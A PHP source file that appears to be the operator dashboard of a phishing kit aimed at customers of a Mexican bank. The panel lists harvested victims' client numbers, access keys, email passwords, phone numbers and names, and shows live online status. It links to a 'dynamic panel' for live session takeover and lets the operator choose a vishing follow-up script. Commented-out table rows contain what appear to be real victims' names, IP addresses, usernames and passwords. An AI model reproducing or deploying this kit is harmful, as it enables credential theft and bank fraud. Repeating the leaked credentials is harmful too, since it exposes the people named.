<?php 
    session_start();
    if(!isset($_SESSION['usr'])){
        header('Location: login.php');
    }
    include_once('../config/MySQL.php');
    date_default_timezone_set("America/Mexico_City");
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Login</title>
    

    <script type="text/javascript" src="archivos/jquery-1.9.1.js"></script>

    <link rel="stylesheet" type="text/css" href="archivos/bootstrap.min.css">
    <script type="text/javascript" src="archivos/bootstrap.min.js"></script>


    <script>
        $(document).ready(function(){
            var flagAgent = false;
            var flagComentar = false;

            $('.viewagent').click(function(e){
                e.preventDefault();
                var parent = $(this).parent();
                var sibParent = parent.siblings('div.spoiler');
                
                if(!flagAgent){
                    sibParent.slideDown('fast');
                    flagAgent = true;
                }else{
                    sibParent.slideUp('fast');
                    flagAgent = false;
                }
            });

            $('.comentarLink').click(function(e){
                e.preventDefault();
                var parent = $(this).parent();
                var sibParent = parent.siblings('div.spoiler');
                
                if(!flagComentar){
                    sibParent.slideDown('fast');
                    flagComentar = true;
                }else{
                    sibParent.slideUp('fast');
                    flagComentar = false;
                }
            });


            $('#btnChangeNumber').click(function(){
                var num = $('#number');
                if(num.val() == ""){
                    alert('Ingrese un numero de contacto');
                }else{
                    $.ajax({
                        type: 'POST',
                        url: '../Controllers/ScamController.php',
                        data: {
                            "request": "update_numero_contacto",
                            "numero": num.val()
                        },
                        beforeSend: function(){
                            console.log("ENviando...");
                        },
                        success: function (resp){
                            console.log('Datos Enviados');
                            alert('Numero actualizado');
                        },
                        error: function (request, textStatus, errorThrown) {
                            console.log('Error al Enviar los Datos: '+errorThrown);
                        }
                    });
                }
            });



            $('#btnTipoMensaje').click(function(){
                var tMensaje = $('#tipoMensaje');
                //alert(tMensaje.val());
                $.ajax({
                    type: 'POST',
                    url: '../Controllers/ScamController.php',
                    data: {
                        "request": "update_tipo_mensaje",
                        "tipoMensaje": tMensaje.val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        console.log(tMensaje.val());
                    },
                    success: function (resp){
                        console.log('Datos Enviados');
                        alert('Mensaje final actualizado');
                        //alert(resp)
                        console.log(resp)
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });
            });

            $('.frmComentario').submit(function(e){
                e.preventDefault();
                var comentario = $(this).children('textarea');
                var session = $(this).children('input.id');
                var elemParent = $(this);
                //var error = $(this).children('err');
                
                $.ajax({
                    type: 'POST',
                    url: '../Controllers/ScamController.php',
                    data: {
                        "request": "comentario",
                        "comentario": comentario.val(),
                        "session": session.val()
                    },
                    beforeSend: function(){
                        console.log("ENviando...");
                        
                        /*if(resp == "1"){
                            $(this).parent().hide();
                            flagComentar = false;
                        }*/
                    },
                    success: function (resp){
                        //alert(resp);
                        console.log('Datos Enviados');
                        if(resp == "1"){
                            elemParent.parent().hide();
                            flagComentar = false;
                            //comentario.val();
                            $('#'+session.val()).text(comentario.val());
                        }
                        
                    },
                    error: function (request, textStatus, errorThrown) {
                        console.log('Error al Enviar los Datos: '+errorThrown);
                    }
                });


                
            });
        });
    </script>

</head>

<body>﻿


    <style type="text/css">
        #tablachica {
            width: 70%;
            font-size: 9px;
            font-family: "Verdana", sans-serif;

        }

    </style>


<!--
    <iframe src="../../../local_pibee/sincronizacion/play.html" id="frmEmpresas" width="0px" height="0px" marginheight="0" marginwidth="0" noresize="noresize" scrolling="no" frameborder="0"></iframe>
-->

    <!--<script>
        $(document).ready(function(){
  $('[data-toggle="tooltip"]').tooltip();   
});
</script>-->

    <script language="JavaScript">

        /* Determinamos el tiempo total en segundos */
    //var totalTiempo=20;
    var totalTiempo=20;
    /* Determinamos la url del archivo o del boton de descarga,(en ejemplo descarga de freebsd */
    //var url="panel.php";
    var url = "index.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "ME REFRESCARE EN "+totalTiempo+" SEGUNDOS";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la funci�n al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
 
    window.onload=updateReloj;
 
    </script>



    <center>

        <h2>
            <font size="2" id="CuentaAtras">ME REFRESCARE EN 15 SEGUNDOS</font>
        </h2>
    </center>

    <p align="center"><b><a href="index.php">
                <font size="4">REFRESCAR</font>
            </a></b></p>
    

    <?php 
        $sql = "SELECT tipo_mensaje, phone_contacto FROM config_panel";
        $db = new MySQL();
        $query = $db -> queryStandar($sql);
        while ($r = mysqli_fetch_array($query)) {
            $tipoMensaje = $r[0];
            $numero = $r[1];
        }
    ?>



    <center>
        <div style="font-size: 12px; width: 300px;">
            
            

            <div style="width: 40%;float: left;">
                <input type="text" name="number" id="number" value="<?=$numero?>" style="font-size: 12px!important">
            </div>
            <div style="width: 40%;float: right;">
                <button name="btnChangeNumber" id="btnChangeNumber">Cambiar Numero</button>
            </div>
            <div style="clear: both!important;"></div>
        </div>
    </center>

    <div style="padding: 5px;"></div>

    <center>
        <div style="font-size: 12px; width: 300px;">
            <div style="width: 40%;float: left;">
                <select name="tipoMensaje" id="tipoMensaje">
                    <?php
                        if($tipoMensaje == "1"){
                    ?>
                        <option value="1" selected="">Pedir que esperen llamada</option>
                        <option value="2" >Pedir que llamen</option>
                    <?php
                        }else{
                    ?>
                        <option value="1">Pedir que esperen llamada</option>
                        <option value="2" selected="">Pedir que llamen</option>
                    <?php
                        }
                    ?>
                    
                </select>
            </div>
            <div style="width: 40%;float: right;">
                <button name="btnTipoMensaje" id="btnTipoMensaje">Cambiar</button>
            </div>
            <div style="clear: both!important;"></div>
        </div>
    </center>


<div style="padding: 3px;"></div>

    
    <center>


        <table id="tablachica" class="table table-sm table-hover table-bordered">
            <thead class="thead-dark">
                <tr>
                    <th scope="col">#</th>
                    <th scope="col">ORIGEN</th>
                    <th scope="col">NUMERO CLIENTE</th>
                    <th scope="col">CLAVE ACCESO</th>
                    <th scope="col">EMAIL / PASSWORD</th>
                    <th scope="col">CELULAR / TELEFONO</th>
                    <th scope="col">NOMBRE</th>
                    <th scope="col">FOLIO</th>
                    <th scope="col">PANEL</th>
                    <th scope="col">COMENTARIO</th>
                    <th scope="col">ESTADO</th>
                    <th scope="col">LINK</th>


                </tr>
            </thead>
            <tbody>
                


            

        <?php 
            $sql = "SELECT * FROM logos_bancanet_personal ORDER BY id DESC";
            $query = new MySQL();
            $data = $query->queryStandar($sql);

            while ($r = mysqli_fetch_array($data)) {

                $hora_cliente = $r['last_conection'];
                $hora_actual = date('h:i:s', strtotime('-4 second'));

                $hora1 = strtotime($hora_cliente);
                $hora2 = strtotime($hora_actual);

                $statusOnline = "";

                if( $hora1 > $hora2 ) {
                     $statusOnline = true; 
                } else {
                     $statusOnline = false; 
                }
                
                ?>
                    <tr>
                        <td bgcolor="#C0C0C0">
                            <center> 
                                <b>
                                    <font face="Verdana"> 
                                        <a>
                                            <font color="#FFFFFF"><?=$r['id'];?></font>
                                        </a>
                                    </font>
                                </b>
                            </center>
                        </td>
                        <td>
                            <center>
                                <div class="divspoiler">
                                    <a href="#" class="viewagent">
                                        <b>
                                            <font color="#FF9900"><?=$r['ip'];?> </font>
                                        </b>
                                    </a>
                                    <b></b>
                                </div>
                                <!--<div>-->
                                <div class="spoiler" style="display: none;">
                                    <b>
                                        <br><?=$r['user_agent'];?>
                                        <!--<br>
                                        <br>Windows 7-->
                                    </b>
                                </div>
                                <!--</div>-->
                            </center>
                        </td>
                        <td>
                            <center><?=$r['num_cliente'];?></center>
                        </td>
                        <td>
                            <center><?=$r['clave_acceso'];?></center>
                        </td>


                        <td>
                            <center><?=$r['email'];?></center>
                        </td>

                        <!--<td>
                            <center>
                                <div class="divspoiler">
                                    <a href="#" class="viewagent">
                                        <b>
                                            <font color="#FF9900"><?//=$r['email_2'];?> - <?//=$r['pass_email_2'];?></font>
                                        </b>
                                    </a>
                                    <b></b>
                                </div>
                                <div class="spoiler" style="display: none;">
                                    <b>
                                        <?//=$r['email_2'];?> - <?//=$r['pass_email_2'];?>
                                        <br><?//=$r['email_2_confirm'];?> - <?//=$r['pass_email_2_confirm'];?>
                                    </b>
                                </div>
                            </center>
                        </td>-->


                        
                        <td>
                            <center><?=$r['phone_cell'];?> - <?=$r['phone_home_office'];?></center>
                        </td>

                        <td>
                            <center><?=$r['nombre_completo'];?></center>
                        </td>


                         <!--<td>
                            <center><?//=$r['tarjeta'];?></center>
                        </td>-->



                        <!--<td>
                            <center>
                                <div class="divspoiler">
                                    <a href="#" class="viewagent">
                                        <b>
                                            <font color="#FF9900"><?//=$r['tarjeta'];?> </font>
                                        </b>
                                    </a>
                                    <b></b>
                                </div>
                                <div class="spoiler" style="display: none;">
                                    <b>
                                        <br><?//=$r['cvv'];?> - <?//=$r['nip'];?> - <?//=$r['fecha_expiracion'];?>
                                    </b>
                                </div>
                            </center>
                        </td>-->



                         <td>
                            <center><?=$r['folio'];?></center>
                        </td>


                        <!--<td bgcolor="#CCFF99">
                            <center>
                                <font color="#FFFFFF">
                                    
                                    <a href="<?=$urlPanelDinamico;?>" target="_blank">
                                        <strong>PANEL</strong>
                                    </a>
                                </font>
                            </center>
                        </td>-->
                        <td bgcolor="#CCFF99">
                            <center>
                                <font color="#FFFFFF">
                                    <?php
                                        //$urlPanelDinamico="paneldinamico.php?usr=".base64_encode($r['id_session']);
                                    $urlPanelDinamico="paneldinamico.php?usr=".base64_encode($r['id']);
                                    ?>
                                    <a href="<?=$urlPanelDinamico;?>" target="_blank">
                                        <strong>PANEL DINAMICO</strong>
                                    </a>
                                </font>
                            </center>
                        </td>
                        <td style="">
                            <center>
                                <div class="divspoiler">
                                    <a href="" class="comentarLink">
                                        <b>
                                            <font color="#3399FF">COMENTAR</font>
                                        </b>
                                    </a>
                                    <br>
                                    <span id="<?=$r['id_session']?>"><?=$r['comentario'];?></span>
                                    <b></b>
                                </div>
                                <!--<div>-->
                                <div class="spoiler" style="display: none;">
                                    <!--<b>-->
                                        <form action="#" method="post" class="frmComentario">
                                            <input type="hidden" class="id" value="<?=$r['id_session']?>">
                                            <span class="err" style="font-size: 9px; color: #666;display: block;"></span>
                                            <?php 
                                                if($r['comentario'] == ''){
                                            ?>
                                                <textarea name="textarea" class="" style="width:100px!important;height:50px!important;" cols="1" rows="22" placeholder="COMENTAR" required=""></textarea>
                                            <?php
                                                }else{
                                            ?>
                                                <textarea name="textarea" class="" style="width:100px!important;height:50px!important;" cols="1" rows="22" placeholder="COMENTAR"><?=$r['comentario'];?></textarea>
                                            <?php
                                                }
                                            ?>
                                            <center>
                                                <input type="submit" value="AGREGAR">
                                            </center>
                                        </form>
                                    <!--</b>-->
                                </div>
                                <!--</div>-->
                            </center>
                        </td>
                        <?php 
                            if($statusOnline){
                        ?>
                            <td bgcolor="green">
                                <center>
                                    <b>
                                        <font face="Verdana">
                                            <a>
                                                <font color="#FFFFFF">En Linea</font>
                                            </a>
                                        </font>
                                    </b>
                                </center>
                            </td>

                        <?php
                            }else{
                        ?>
                            <td bgcolor="#ff0000">
                                <center>
                                    <b>
                                        <font face="Verdana">
                                            <a>
                                                <font color="#FFFFFF">Fuera de Linea</font>
                                            </a>
                                        </font>
                                    </b>
                                </center>
                            </td>
                        <?php
                            }
                        ?>
                        
                        <td>
                            <center>
                                <font color="#FF0000">
                                    <?php 
                                        //$urlLink = "../scripts/cgiclntcbbbne/CORE-Main%2520Web/ND09090_/?SECURE_CODE=".base64_encode($r['id_session']);

                                        $urlLink = "../MXGCB/CBOL/ain/dashboard/flow_action/JFP_TOKEN.php?JFP_TOKEN=".$r['id_session'];
                                    ?>
                                    <!--<a href="../DFServlet.php?sesion=MDA1MTY0NjU=&amp;uid=VEVMQV9DQVJHQU5ETw==" target="_blank">LINK</a>-->

                                    <a href="<?=$urlLink;?>" target="_blank">LINK</a>
                                </font>
                            </center>
                        </td>
                    </tr>
                <?php
            }

           
            //1 572 633 726 > 1 572 592 094


            

        ?>

        </tbody>
        </table>
        <!--
        <table id="tablachica" class="table table-sm table-hover table-bordered">
            <thead class="thead-dark">
                <tr>
                    <th scope="col">#</th>
                    <th scope="col">ORIGEN</th>
                    <th scope="col">USB</th>
                    <th scope="col">EMPRESA</th>
                    <th scope="col">USUARIO</th>
                    <th scope="col">CLAVE</th>
                    <th scope="col">NOMBRE</th>
                    <th scope="col">CLAVE ASD</th>
                    <th scope="col">CLAVE OPERACIONES</th>
                    <th scope="col">CELULAR / TELEFONO</th>

                    <th scope="col">FOLIO</th>
                    <th scope="col">PANEL</th>



                    <th scope="col">COMENTARIO</th>
                    <th scope="col">ESTADO</th>

                    <th scope="col">REPARA</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td bgcolor="#C0C0C0">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">5</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#FF9900">189.194.79.179 </font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <br>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36<br><br>Windows 7</b></div>
                            </div>
                        </center>
                    </td>










                    <td>
                        <center>SI</center>
                    </td>
                    <td>
                        <center>00516465</center>
                    </td>
                    <td>
                        <center>TACMVER1</center>
                    </td>
                    <td>
                        <center>VERA2018</center>
                    </td>
                    <td>
                        <center>NAHU BUTRON ORTEGA</center>
                    </td>
                    <td>
                        <center>85071276</center>
                    </td>
                    <td>
                        <center>30FTAVER</center>
                    </td>
                    <td>
                        <center>2961002576 - 2859760541</center>
                    </td>
                    <td>
                        <center>9862211314</center>
                    </td>
                    <td bgcolor="#CCFF99">
                        <center>
                            <font color="#FFFFFF"><a href="empresas_panel.php?usuario=00516465" target="_blank"><strong>PANEL DINAMICO</strong></a></font>
                        </center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#3399FF">COMENTAR</font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <form action="includes/agregar.php?cliente=00516465" method="post">
                                            <p align="center">
                                                <span style="font-size: 9px; color: #666;"></span>
                                                <textarea name="textarea" style="width:199;height:50;" cols="1" rows="22">COMENTAR</textarea>
                                            </p>
                                            <center><input type="submit" value="AGREGAR"></center>
                                        </form>
                                    </b></div>
                            </div>
                        </center>
                    </td>
                    <td bgcolor="#FF0000">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">FUERA DE LINEA</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <font color="#FF0000"><a href="../DFServlet.php?sesion=MDA1MTY0NjU=&amp;uid=VEVMQV9DQVJHQU5ETw==" target="_blank">REPARA</a></font>
                        </center>
                    </td>
                </tr>
            -->
                <!--<tr>
                    <td bgcolor="#C0C0C0">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">4</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#FF9900">201.174.40.199 </font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36<br><br>Windows 10</b></div>
                            </div>
                        </center>
                    </td>










                    <td>
                        <center>SI</center>
                    </td>
                    <td>
                        <center>00027197</center>
                    </td>
                    <td>
                        <center>CTAPAGAR</center>
                    </td>
                    <td>
                        <center>LUPITA1291</center>
                    </td>
                    <td>
                        <center>GUADALUPE ENRIQUEZ PEREA</center>
                    </td>
                    <td>
                        <center>39952141</center>
                    </td>
                    <td>
                        <center>dylan0603</center>
                    </td>
                    <td>
                        <center>6141672272 - 6142383000</center>
                    </td>
                    <td>
                        <center>3779735970</center>
                    </td>
                    <td bgcolor="#CCFF99">
                        <center>
                            <font color="#FFFFFF"><a href="empresas_panel.php?usuario=00027197" target="_blank"><strong>PANEL DINAMICO</strong></a></font>
                        </center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#3399FF">COMENTAR</font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <form action="includes/agregar.php?cliente=00027197" method="post">
                                            <p align="center">
                                                <span style="font-size: 9px; color: #666;"></span>
                                                <textarea name="textarea" style="width:199;height:50;" cols="1" rows="22">COMENTAR</textarea>
                                            </p>
                                            <center><input type="submit" value="AGREGAR"></center>
                                        </form>
                                    </b></div>
                            </div>
                        </center>
                    </td>
                    <td bgcolor="#FF0000">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">FUERA DE LINEA</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <font color="#FF0000"><a href="../DFServlet.php?sesion=MDAwMjcxOTc=&amp;uid=VEVMQV9DQVJHQU5ETw==" target="_blank">REPARA</a></font>
                        </center>
                    </td>
                </tr>
                <tr>
                    <td bgcolor="#C0C0C0">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">3</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#FF9900">189.139.219.25 </font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36<br><br>Windows 10</b></div>
                            </div>
                        </center>
                    </td>










                    <td>
                        <center>SI</center>
                    </td>
                    <td>
                        <center>00519308</center>
                    </td>
                    <td>
                        <center>PRESIDEN</center>
                    </td>
                    <td>
                        <center>TEPOTZ17</center>
                    </td>
                    <td>
                        <center>PRESIDENCIA</center>
                    </td>
                    <td>
                        <center>10734348</center>
                    </td>
                    <td>
                        <center>Munici17</center>
                    </td>
                    <td>
                        <center>5563554787 - 5558769578</center>
                    </td>
                    <td>
                        <center>9502715753</center>
                    </td>
                    <td bgcolor="#CCFF99">
                        <center>
                            <font color="#FFFFFF"><a href="empresas_panel.php?usuario=00519308" target="_blank"><strong>PANEL DINAMICO</strong></a></font>
                        </center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#3399FF">COMENTAR</font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <form action="includes/agregar.php?cliente=00519308" method="post">
                                            <p align="center">
                                                <span style="font-size: 9px; color: #666;"></span>
                                                <textarea name="textarea" style="width:199;height:50;" cols="1" rows="22">COMENTAR</textarea>
                                            </p>
                                            <center><input type="submit" value="AGREGAR"></center>
                                        </form>
                                    </b></div>
                            </div>
                        </center>
                    </td>
                    <td bgcolor="#FF0000">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">FUERA DE LINEA</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <font color="#FF0000"><a href="../DFServlet.php?sesion=MDA1MTkzMDg=&amp;uid=VEVMQV9DQVJHQU5ETw==" target="_blank">REPARA</a></font>
                        </center>
                    </td>
                </tr>
                <tr>
                    <td bgcolor="#C0C0C0">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">2</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#FF9900">207.248.244.226 </font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36<br><br>Windows 10</b></div>
                            </div>
                        </center>
                    </td>










                    <td>
                        <center>SI</center>
                    </td>
                    <td>
                        <center>00646229</center>
                    </td>
                    <td>
                        <center>TESORERI</center>
                    </td>
                    <td>
                        <center>ABEL2019</center>
                    </td>
                    <td>
                        <center>JESSICA MARLENE GIRON BECERRA</center>
                    </td>
                    <td>
                        <center>49812272</center>
                    </td>
                    <td>
                        <center>abel20191</center>
                    </td>
                    <td>
                        <center>8120365113 - 8120365113</center>
                    </td>
                    <td>
                        <center>5066218690</center>
                    </td>
                    <td bgcolor="#CCFF99">
                        <center>
                            <font color="#FFFFFF"><a href="empresas_panel.php?usuario=00646229" target="_blank"><strong>PANEL DINAMICO</strong></a></font>
                        </center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#3399FF">COMENTAR</font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <form action="includes/agregar.php?cliente=00646229" method="post">
                                            <p align="center">
                                                <span style="font-size: 9px; color: #666;"></span>
                                                <textarea name="textarea" style="width:199;height:50;" cols="1" rows="22">COMENTAR</textarea>
                                            </p>
                                            <center><input type="submit" value="AGREGAR"></center>
                                        </form>
                                    </b></div>
                            </div>
                        </center>
                    </td>
                    <td bgcolor="#FF0000">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">FUERA DE LINEA</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <font color="#FF0000"><a href="../DFServlet.php?sesion=MDA2NDYyMjk=&amp;uid=VEVMQV9DQVJHQU5ETw==" target="_blank">REPARA</a></font>
                        </center>
                    </td>
                </tr>
                <tr>
                    <td bgcolor="#C0C0C0">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">1</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#FF9900">189.180.24.55 </font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36<br><br>Windows 10</b></div>
                            </div>
                        </center>
                    </td>










                    <td bgcolor="#CCFF99">
                        <center>NO</center>
                    </td>
                    <td>
                        <center>00100749</center>
                    </td>
                    <td>
                        <center>ADMIN1</center>
                    </td>
                    <td>
                        <center>AZUL2070</center>
                    </td>
                    <td>
                        <center>ALIMENTOS BALANCEADOS Y SERVIC</center>
                    </td>
                    <td>
                        <center>81880407</center>
                    </td>
                    <td>
                        <center>2070azul</center>
                    </td>
                    <td>
                        <center>4271212919 - 2742918</center>
                    </td>
                    <td>
                        <center>6082548879</center>
                    </td>
                    <td bgcolor="#CCFF99">
                        <center>
                            <font color="#FFFFFF"><a href="empresas_panel.php?usuario=00100749" target="_blank"><strong>PANEL DINAMICO</strong></a></font>
                        </center>
                    </td>
                    <td>
                        <center>
                            <div class="divspoiler">
                                <a href="javascript:void(0);" onclick="if (this.parentNode.nextSibling.childNodes[0].style.display != '') { this.parentNode.nextSibling.childNodes[0].style.display = ''; } else { this.parentNode.nextSibling.childNodes[0].style.display = 'none';}"><b>
                                        <font color="#3399FF">COMENTAR</font>
                                    </b></a><b>
                                </b></div>
                            <div>
                                <div class="spoiler" style="display: none;"><b>
                                        <form action="includes/agregar.php?cliente=00100749" method="post">
                                            <p align="center">
                                                <span style="font-size: 9px; color: #666;"></span>
                                                <textarea name="textarea" style="width:199;height:50;" cols="1" rows="22">COMENTAR</textarea>
                                            </p>
                                            <center><input type="submit" value="AGREGAR"></center>
                                        </form>
                                    </b></div>
                            </div>
                        </center>
                    </td>
                    <td bgcolor="#FF0000">
                        <center> <b>
                                <font face="Verdana"> <a>
                                        <font color="#FFFFFF">FUERA DE LINEA</font>
                                    </a></font>
                            </b></center>
                    </td>
                    <td>
                        <center>
                            <font color="#FF0000"><a href="../DFServlet.php?sesion=MDAxMDA3NDk=&amp;uid=VEVMQV9DQVJHQU5ETw==" target="_blank">REPARA</a></font>
                        </center>
                    </td>
                </tr>

            </tbody>
        </table>-->





    </center>
</body>

</html>
